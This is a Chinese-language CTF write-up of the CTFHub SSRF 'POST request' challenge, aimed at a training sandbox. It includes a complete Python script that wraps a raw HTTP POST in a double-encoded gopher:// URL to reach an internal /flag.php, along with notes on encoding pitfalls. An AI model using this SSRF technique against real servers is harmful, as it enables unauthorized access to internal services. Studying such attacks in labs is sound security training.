【CTFHub】Web-SSRF POST请求 Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：CTF | 标签：CTFHub, Web, SSRF, POST请求, Gopher协议, Python脚本, 双重编码

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SSRF / POST请求
  • 题目名称：POST请求
  • 环境：VS Code + Python 环境。
  • 目标：利用 SSRF 漏洞构造并发送 HTTP POST 请求，访问内网的 /flag.php，提交动态 key 以获取 Flag。

2. 解题思路与知识点

本关核心考点：利用 Gopher 协议构造任意 TCP 数据包，实现 SSRF 环境下的 POST 请求发送。题目明确指出“这次是发一个HTTP POST请求”，且后端使用 PHP 的 cURL 实现，因此必须使用 Gopher 协议来绕过 HTTP 协议只能发送 GET 请求的限制。

工具与方案选择：
  • 为什么不直接在浏览器输入框打 Gopher Payload？ 浏览器会对 Gopher Payload 进行自动 URL 编码（包含特殊字符 :、/、_），导致后端接收时，原本构造好的 HTTP 报文换行符和空格被破坏，内网服务器无法解析，最终回显默认页面。
  • Python 脚本的优势： 可以精确控制 Payload 的编码层级（双重编码），并通过正则表达式自动提取 Flag，避免手动复制带来的字符污染或遗漏。

3. 详细步骤

第一步：获取动态 key

操作： 在浏览器访问 ?url=http://127.0.0.1/flag.php，然后右键选择“查看页面源代码”。

执行目的：寻找服务端验证所需的动态 key。

回显结果：在 HTML 注释中发现 <!-- Debug: key=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -->。

获得信息：确认服务端要求 POST 提交该 key 才能获取 Flag。注意，此处必须使用 http:// 协议触发 PHP 代码执行，若使用 file:// 只能读取到未执行的源码 <?php echo $key;?>。

第二步：编写 Python 脚本构造 Gopher Payload

脚本代码：

import requests
import urllib.parse
import re

# 1. 靶场 URL（注意不要包含 ?url=）
base_url = "http://challenge-xxxx.sandbox.ctfhub.com:10800"

# 2. 填入从源码中获取的动态 key
key = "d1a797e1e354a968400e3eb68e13ebd7"

# 3. 构造 POST Body
post_body = f"key={key}"

# 4. 构造原始 HTTP POST 请求报文
raw_request = (
    "POST /flag.php HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(post_body)}\r\n"
    "Connection: close\r\n"
    "\r\n"
    f"{post_body}"
)

# 5. 第一次 URL 编码（对原始 HTTP 报文）
encoded_http = urllib.parse.quote(raw_request)

# 6. 拼接 Gopher 协议
gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"

# 7. 第二次 URL 编码（对整个 Gopher URL，防止特殊字符截断）
final_payload = urllib.parse.quote(gopher_payload)

# 8. 发送请求，直接拼接 URL 参数
attack_url = f"{base_url}/?url={final_payload}"
print("[*] 正在发送攻击请求...")

try:
    r = requests.get(attack_url, timeout=10)
    # 9. 使用正则精准提取 Flag
    match = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
    if match:
        print("\n[+] 成功获取 Flag！")
        print(f"[+] {match.group(0)}")
    else:
        print("[-] 未提取到 Flag，原始回显如下：")
        print(r.text[:500])
except Exception as e:
    print("[-] 请求出现异常：", e)

代码逐行解析：

  • import requests, urllib.parse, re：导入网络请求模块、URL 编码模块和正则表达式模块。
  • post_body = f"key={key}"：构造 POST 请求的 Body 内容。
  • raw_request：严格按照 HTTP 协议拼装报文。换行必须使用 \r\n，Content-Length 必须动态计算 Body 的真实长度（len(post_body)）。
  • urllib.parse.quote(raw_request)：第一次 URL 编码。Python 的 quote 函数会自动将 \r\n 编码为 %0D%0A，空格编码为 %20。这一步绝不能手动 replace，否则会导致 %0D%0D%0A 的畸形换行符，破坏 HTTP 报文结构。
  • gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"：拼接 Gopher 协议头。Gopher 协议通过 _ 后面拼接经过编码的 TCP 数据流。
  • final_payload = urllib.parse.quote(gopher_payload)：第二次 URL 编码（关键步骤）。因为 Gopher URL 是作为 ?url= 参数的值进行传递的，如果直接发送，其中的 :、/、_ 等特殊字符会被服务器或浏览器截断，导致请求失败。对整个 URL 再次编码，能确保 Payload 完整送达。
  • requests.get(attack_url)：直接拼接 URL 发送请求，避免 requests 库对 params 参数进行自动编码带来的干扰。
  • re.search(r'ctfhub\{[a-f0-9]+\}', r.text)：用正则表达式从 HTML 响应中精准提取纯净的 Flag 字符串，避免复制到无关的 HTML 标签。

第三步：执行脚本获取 Flag

执行操作：在 VS Code 终端中运行脚本。

回显结果：终端打印出 [+] ctfhub{94854d51faefd2992947f617}。

获得信息：Gopher POST 请求构造成功，提交 Flag 后通关。

4. 踩坑记录与复盘

  • 坑1：协议混淆导致获取 Key 失败。 使用 file:///var/www/html/flag.php 读取源码时，只能得到未被执行的 PHP 代码 <?php echo $key;?>。必须使用 http://127.0.0.1/flag.php 让服务器执行该文件，才能在渲染后的 HTML 注释中获取真实的动态 key 值。
  • 坑2：画蛇添足的 replace 导致双重编码灾难。 最初在第一次编码后加上了 encoded_http = encoded_http.replace("%0A", "%0D%0A")。由于 Python 的 quote() 已经自动将 \r\n 转成了 %0D%0A，再次 replace 会把 %0A 替换为 %0D%0A，导致最终结果变成 %0D%0D%0A。这种畸形的换行符导致 HTTP 报文头部与 Body 的分界失效，内网服务器无法正确解析 POST 请求。
  • 坑3：Content-Length 未动态计算。 在改变 Body 内容（从 flag=1 改为 key=xxx）后，长度从 6 变成了 36。如果未使用 len(post_body) 动态计算，而是硬编码长度，HTTP 请求体会被截断，导致 POST 数据不完整，验证失败。
  • 坑4：脏数据缓存导致的假象。 由于之前发送了畸形请求，后端返回了错误的容错页面。正则表达式 re.search 恰好从缓存页面中匹配到了旧环境残留的 Flag（b644...），导致我们误以为脚本运行成功，实则是匹配到了无效的过期数据。

5. 知识总结

  • Gopher 协议构造 POST 请求的核心逻辑： 构造合法的 HTTP 报文 -> 第一次 URL 编码 -> 拼接 Gopher 协议头 -> 对整个 Gopher URL 进行第二次 URL 编码。
  • 动态 Key 的处理： CTF 题目中经常遇到由服务端动态生成的校验值，必须通过触发代码执行的方式获取（如使用 http:// 协议），而不能仅通过读文件源码获取。
  • 脚本编写规范： 使用 Python 自动计算 Content-Length、使用正则提取 Flag、使用双重编码保护特殊字符，是 SSRF Gopher 攻击的标准模板。
